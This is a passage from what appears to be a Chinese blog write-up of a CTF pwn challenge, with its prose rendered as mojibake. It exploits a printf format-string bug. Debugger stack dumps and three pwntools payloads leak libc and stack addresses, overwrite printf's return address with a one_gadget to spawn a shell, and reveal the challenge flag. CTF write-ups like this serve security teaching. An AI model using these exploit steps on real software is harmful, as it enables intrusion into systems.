<font color=#12488B>0x7fffffffdbd8</font>:	0x5b70ffa5294da700	0x0000000000000001
<font color=#ff0000>0x7fffffffdbe8</font>:	0x00007ffff7c29d90	0x0000000000000000
<font color=#12488B>0x7fffffffdbf8</font>:	0x00005555555551f0	0x0000000100000000
<font color=#12488B>< Skipped ></font>
<font color=#12488B>0x7fffffffdcb8</font>:	0x00005555555550c0	0x00007fffffffdcf0
<font color=#12488B>0x7fffffffdcc8</font>:	0x0000000000000000	0x0000000000000000
<font color=#12488B>0x7fffffffdcd8</font>:	0x00005555555550e5	0x00007fffffffdce8
<font color=#C01C28><b>pwndbg&gt; </b></font>
</pre><p>å¯ä»¥çœ‹åˆ°ï¼Œ <code>0x00007ffff7c29d90</code> ä½äº <code>0x7fffffffdbe8</code> å¤„ï¼Œè€Œ rsp æŒ‡å‘ <code>0x7fffffffd9c8</code> ï¼Œæ‰€ä»¥åœ¨æ ˆä¸­æ˜¯ç¬¬ 69 ä½ï¼Œå› æ­¤å°±æ˜¯æ ¼å¼å­—ç¬¦ä¸²çš„ç¬¬ 73 ä½å‚æ•°ã€‚äº‹å®ä¸Šï¼Œè‹¥åœ¨è°ƒè¯•æ—¶è¾“å…¥ <code>%73$016llx</code> ï¼Œç¨‹åºç¡®å®ä¼šè¾“å‡º <code>00007ffff7c29d90</code> ï¼Œç¬¦åˆè¦æ±‚ã€‚</p><p>ç¼–å†™ä¸‹é¢çš„ python ä»£ç ä»¥è·å– libc åŸºå€ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># First payload: leaking libc address</span>
</span></span><span class=line><span class=cl><span class=n>payload1</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;%73$016l&#39;</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;lxKKKKKK&#39;</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>recv</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;KKKKKK&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>recv</span> <span class=o>=</span> <span class=n>recv</span><span class=o>.</span><span class=n>strip</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;KKKKKK&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>main_ret_addr</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>recv</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>__libc_start_main_addr</span> <span class=o>=</span> <span class=n>main_ret_addr</span> <span class=o>+</span> <span class=mh>0x30</span>
</span></span><span class=line><span class=cl><span class=n>libc_addr</span> <span class=o>=</span> <span class=n>__libc_start_main_addr</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;__libc_start_main&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s2>&#34;main_ret_addr =&gt; 0x</span><span class=si>{:016X}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>main_ret_addr</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s2>&#34;libc_addr     =&gt; 0x</span><span class=si>{:016X}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>libc_addr</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src=https://s2.loli.net/2024/07/29/phyjcWksBP1intq.png loading=lazy alt=image-20240728234411166.png></p><p>è·å¾— libc åœ°å€ä¸º <code>0x000079FB95A00000</code></p><h3 id=leaking-stack-address>Leaking stack address</h3><p>ç”±äºæ ˆä¹‹é—´çš„ç›¸å¯¹åç§»åº”è¯¥ä¸å˜ï¼Œæ‰€ä»¥åº”è¯¥å¯ä»¥é€šè¿‡æ‰¾åˆ°ä¸€ä¸ªé“¾ï¼šæ ˆä¸Šä¸€ä¸ªä½ç½® A ï¼Œå…¶æŒ‡å‘æ ˆçš„å¦ä¸€ä¸ªä½ç½® B ï¼Œæ‰¾åˆ° A ã€ B å…¶å…³äºæ ¼å¼å­—ç¬¦ä¸²çš„åç§»ä½ç½®ã€‚ç„¶ååˆ©ç”¨ <code>printf() %x</code> å‘ B çš„åœ°å€æ¼å‡ºæ¥ï¼Œå› æ­¤å°±å¯ä»¥æ‰¾å‡º rsp çš„åœ°å€ï¼Œæœ€åå°±å¯ä»¥å°† printf_ret_addr æ”¹å†™æˆ one_gadgetã€‚</p><p>åœ¨ä¸€æ¬¡åŠ¨æ€è°ƒè¯•ä¸­ï¼Œæˆ‘æ³¨æ„åˆ°äº†è¿™æ ·ä¸€ä¸ªå¯ä»¥å­˜åœ¨çš„é“¾ï¼ˆæ³¨æ„çº¢è‰²å­—ï¼‰ï¼š</p><pre><font color=#C01C28><b>pwndbg&gt; </b></font>x /110gx $rsp
<font color=#12488B>0x7fffffffd9c8</font>:	0x000055555555528d	0x654a6568546e7552
<font color=#12488B>0x7fffffffd9d8</font>:	0x0000000a736c6577	0x0000000000000000
<font color=#12488B> < skipped > </font>
<font color=#12488B>0x7fffffffdbc8</font>:	0x0000000000000000	0x0000000000000000
<font color=#12488B>0x7fffffffdbd8</font>:	0xdf6e9e6f3d379b00	0x0000000000000001
<font color=#12488B>0x7fffffffdbe8</font>:	0x00007ffff7c29d90	0x0000000000000000
<font color=#12488B>0x7fffffffdbf8</font>:	0x00005555555551f0	0x0000000100000000
<font color=#FF0000>0x7fffffffdc08</font>:	<font color=#FF0000>0x00007fffffffdcf8</font>	0x0000000000000000
<font color=#12488B>0x7fffffffdc18</font>:	0x8843981ffe157fda	0x00007fffffffdcf8
<font color=#12488B> < skipped > </font>
<font color=#12488B>0x7fffffffdce8</font>:	0x000000000000001c	0x0000000000000001
<font color=#FF0000>0x7fffffffdcf8</font>:	0x00007fffffffe083	0x0000000000000000
<font color=#12488B>0x7fffffffdd08</font>:	0x00007fffffffe0a8	0x00007fffffffe0be
<font color=#12488B>0x7fffffffdd18</font>:	0x00007fffffffe0e7	0x00007fffffffe15b
<font color=#12488B>0x7fffffffdd28</font>:	0x00007fffffffe1b1	0x00007fffffffe1c2
<font color=#C01C28><b>pwndbg&gt; </b></font>
</pre><p><code>0x7fffffffdc08</code> å¤„çš„å†…å­˜æŒ‡å‘æ ˆçš„å¦ä¸€å¤„å†…å­˜ <code>0x00007fffffffdcf8</code> ï¼Œè€Œ rsp æŒ‡å‘ <code>0x7fffffffd9c8</code> ï¼Œæ‰€ä»¥ A åœ¨æ ˆä¸­ç¬¬ 73 ä¸ªä½ç½®ï¼Œæ˜¯ç›¸å¯¹æ ¼å¼å­—ç¬¦ä¸²ç¬¬ 77 ä¸ªå‚æ•°ï¼Œè€Œ B åœ¨æ ˆä¸­ç¬¬ 103 ä¸ªä½ç½®ï¼Œ ç›¸å¯¹ rsp åç§»å€¼ä¸º (103 - 1) * 8 = 0x330 ã€‚</p><p>ç¼–å†™å¦‚ä¸‹ payload è·å– <code>printf()</code> çš„è¿”å›åœ°å€ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=c1># Second payload : leaking stack address</span>
</span></span><span class=line><span class=cl><span class=n>payload2</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;%77$016l&#39;</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;lxKKKKKK&#39;</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>recv2</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;KKKKKK&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>recv2</span> <span class=o>=</span> <span class=n>recv2</span><span class=o>.</span><span class=n>strip</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;KKKKKK&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>arg_103_addr</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>recv2</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>printf_ret_addr</span> <span class=o>=</span> <span class=n>arg_103_addr</span> <span class=o>-</span> <span class=mh>0x330</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s2>&#34;arg_103_addr    =&gt; 0x</span><span class=si>{:016X}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>arg_103_addr</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s2>&#34;printf_ret_addr =&gt; 0x</span><span class=si>{:016X}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>printf_ret_addr</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>è¿è¡Œæ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src=https://s2.loli.net/2024/07/29/pEO7SYrc8qwVimn.png loading=lazy alt=image-20240729170544644.png></p><p>è·å¾— <code>printf()</code> æ ˆåŸºå€ä¸º <code>0x00007FFF27F65378</code></p><h3 id=hijacking-printf-return-addr--getting-system-shell>Hijacking printf() return addr & getting system shell</h3><p>ç¼–å†™å¦‚ä¸‹ payload ä»¥æ‰§è¡Œ system call shell å¹¶è·å–flag:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># Third payload: getting system shell</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>one_gadget</span> <span class=o>=</span> <span class=mh>0xebc85</span> <span class=o>+</span> <span class=n>libc_addr</span>
</span></span><span class=line><span class=cl><span class=n>payload3</span> <span class=o>=</span> <span class=n>fmtstr_payload</span><span class=p>(</span><span class=mi>6</span><span class=p>,{</span><span class=n>printf_ret_addr</span><span class=p>:</span><span class=n>one_gadget</span><span class=p>})</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>æœ€ç»ˆè¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src=https://s2.loli.net/2024/07/29/Mv6dyTt4zFNbJ5a.png loading=lazy alt=image-20240729170928581.png></p><p>è·å¾— flag ä¸º <code>AAA{3sc@pe_f3Om_wh1l3_1_i5_E4sy}</code></p></section><footer class=article-footer><section class=article-tags><a href=/tags/stack-overflow/>Stack Overflow</a>
<a href=/tags/fsb/>FSB</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css integrity=sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI+WdtXRGWt2kTvGFasHpSy3SV crossorigin=anonymous><script src=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js integrity=sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG+vnGctmUb0ZY0l8 crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js integrity=sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05 crossorigin=anonymous defer></script><script>window.addEventListener("DOMContentLoaded",()=>{renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}],ignoredClasses:["gist"]})})</script></article><aside class=related-content--wrapper><h2 class=section-title>ç›¸å…³æ–‡ç« </h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/fpga02_%E4%B8%83%E6%AE%B5%E6%95%B0%E7%A0%81%E7%AE%A1%E6%98%BE%E7%A4%BA%E8%AF%91%E7%A0%81%E5%99%A8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%BA%94%E7%94%A8/><div class=article-details><h2 class=article-title>FPGA02_ä¸ƒæ®µæ•°ç ç®¡æ˜¾ç¤ºè¯‘ç å™¨è®¾è®¡ä¸åº”ç”¨</h2></div></a></article><article><a href=/p/fpga01_3-8%E8%AF%91%E7%A0%81%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%BA%94%E7%94%A8/><div class=article-details><h2 class=article-title>FPGA01_3-8è¯‘ç å™¨çš„è®¾è®¡ä¸åº”ç”¨</h2></div></a></article><article><a href=/p/mitms01_%E8%AF%BE%E7%A8%8B%E6%A6%82%E8%BF%B0%E4%B8%8Eshell/><div class=article-details><h2 class=article-title>MITMS01_è¯¾ç¨‹æ¦‚è¿°ä¸Shell</h2></div></a></article><article><a href=/p/mitms01a_%E8%AF%BE%E7%A8%8B%E6%A6%82%E8%BF%B0%E4%B8%8Eshell/><div class=article-details><h2 class=article-title>MITMS01a_è¯¾ç¨‹æ¦‚è¿°ä¸Shell</h2></div></a></article></div></div></aside><div id=gitalk-container></div><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css><script src=https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js></script><script src=https://cdn.jsdelivr.net/npm/blueimp-md5@2.18.0/js/md5.min.js></script><script>const gitalk=new Gitalk({clientID:"",clientSecret:"",repo:"",owner:"",admin:[""],distractionFreeMode:!1,id:md5(location.pathname)});(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("gitalk-container").innerHTML="Gitalk comments not available by default when the website is previewed locally.";return}gitalk.render("gitalk-container")})()</script><footer class=site-footer><section class=copyright>&copy;
2020 -
2024 ç¯ç›çš„ç¼çº«å·¥å‚</section><section class=powerby>ä½¿ç”¨ <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> æ„å»º<br>ä¸»é¢˜ <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.26.0>Stack</a></b> ç”± <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> è®¾è®¡</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>